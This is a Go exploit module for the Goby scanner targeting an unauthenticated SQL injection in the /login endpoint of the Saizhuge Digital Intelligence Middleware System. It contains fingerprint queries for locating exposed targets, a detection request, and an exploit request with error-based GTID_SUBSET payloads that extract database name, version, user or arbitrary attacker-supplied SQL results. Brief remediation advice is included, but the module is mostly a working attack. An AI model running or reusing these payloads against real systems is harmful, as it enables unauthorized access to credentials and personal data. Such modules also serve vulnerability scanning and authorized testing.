package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Saizhuge Digital Intelligence Middleware System /login SQL Injection Vulnerability",
    "Description": "<p>The Saizhuge Digital Intelligence Middleware System is a software product designed to provide digital transformation and upgrades for enterprise-level customers. It aims to help enterprises integrate promotion, sales, service, and management into a unified closed-loop service. Based on the Saizhuge platform, it includes a series of products such as CRM (Customer Relationship Management), SCRM (Social Customer Relationship Management), ERP (Enterprise Resource Planning), OA (Office Automation), BI (Business Intelligence), and MES (Manufacturing Execution System). These products cover but are not limited to tools and services for advertising, customer acquisition, sales, customer management, orders, production, inventory, contracts, finance, approvals, HR, and training. A SQL injection vulnerability exists in the system's /login interface, allowing attackers to obtain sensitive information from the database (such as administrator passwords and user personal information), and even write Trojans to the server under high privileges to further gain system access.</p>",
    "Product": "Saizhuge Digital Intelligence Middleware System",
    "Homepage": "http://saizhuge.com/",
    "DisclosureDate": "2024-12-26",
    "PostTime": "2024-12-26",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"static/index/image/login_left.png\" && body=\"赛诸葛\"",
    "GobyQuery": "body=\"static/index/image/login_left.png\" && body=\"赛诸葛\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive information from the database through SQL injection, potentially leading to data leakage, privilege escalation, and even complete server control.</p>",
    "Recommendation": "<p>1. Regularly monitor vendor updates and upgrade to the latest version: <a href=\"http://saizhuge.com/\">http://saizhuge.com/</a></p><p>2. Deploy Web Application Firewall (WAF) to monitor database operations in real-time.</p><p>3. Restrict public access to the system or limit access permissions to reduce the attack surface.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144730910?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "database(),version(),user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT md5({{{random_int}}})),0x7e),3469) AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{random_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT {{{payload}}}),0x7e),3469) AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "Malformed GTID set specification '~([^'\"]+)~'",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|Malformed GTID set specification '~([^'\"]+)~'",
                "output|when|attackType=sqlpoint|{{{lastreq}}}username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3469=3469,version()))),0x7e),3469) AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member="
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "赛诸葛数字化智能中台系统 /login SQL 注入漏洞",
            "Product": "赛诸葛数字化智能中台系统",
            "Description": "<p>赛诸葛数字化智能中台系统是一款为企业级客户提供数智化转型升级的软件产品，旨在帮助企业实现推广、销售到服务、管理全链条的打通，形成一体化闭环式服务。系统以赛诸葛平台为基础，涵盖了CRM（客户关系管理）、SCRM（社会化客户关系管理）、ERP（企业资源计划）、OA（办公自动化）、BI（商业智能）、MES（制造执行系统）等一系列产品。这些产品包含但不限于广告、获客、销售、客户、订单、生产、库存、合同、财务、审批、人事、培训等管理运营工具和技术服务。系统的 /login 登录接口存在SQL注入漏洞，攻击者可以通过该漏洞获取数据库中的敏感信息（如管理员密码、用户个人信息），甚至在高权限情况下向服务器写入木马，进一步获取系统权限。</p>",
            "Recommendation": "<p>1. 建议及时关注厂商信息并更新到最新版本：<a href=\"http://saizhuge.com/\">http://saizhuge.com/</a></p><p>2. 部署 Web 应用防火墙（WAF），对数据库操作进行实时监控。</p><p>3. 禁止公网访问该系统，或限制访问权限以减少攻击面。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过SQL注入获取数据库中的敏感信息（如管理员密码、用户个人信息），甚至在高权限情况下向服务器写入木马，进一步获取系统权限，可能导致数据泄露、权限提升及系统完全控制。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Saizhuge Digital Intelligence Middleware System /login SQL Injection Vulnerability",
            "Product": "Saizhuge Digital Intelligence Middleware System",
            "Description": "<p>The Saizhuge Digital Intelligence Middleware System is a software product designed to provide digital transformation and upgrades for enterprise-level customers. It aims to help enterprises integrate promotion, sales, service, and management into a unified closed-loop service. Based on the Saizhuge platform, it includes a series of products such as CRM (Customer Relationship Management), SCRM (Social Customer Relationship Management), ERP (Enterprise Resource Planning), OA (Office Automation), BI (Business Intelligence), and MES (Manufacturing Execution System). These products cover but are not limited to tools and services for advertising, customer acquisition, sales, customer management, orders, production, inventory, contracts, finance, approvals, HR, and training. A SQL injection vulnerability exists in the system's /login interface, allowing attackers to obtain sensitive information from the database (such as administrator passwords and user personal information), and even write Trojans to the server under high privileges to further gain system access.</p>",
            "Recommendation": "<p>1. Regularly monitor vendor updates and upgrade to the latest version: <a href=\"http://saizhuge.com/\">http://saizhuge.com/</a></p><p>2. Deploy Web Application Firewall (WAF) to monitor database operations in real-time.</p><p>3. Restrict public access to the system or limit access permissions to reduce the attack surface.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive information from the database through SQL injection, potentially leading to data leakage, privilege escalation, and even complete server control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "random_int": "define|variable|{{{rand|int|8}}}",
        "random_md5": "define|md5|{{{random_int}}}"
    },
    "VariablesOrder": [
        "payload",
        "random_int",
        "random_md5"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
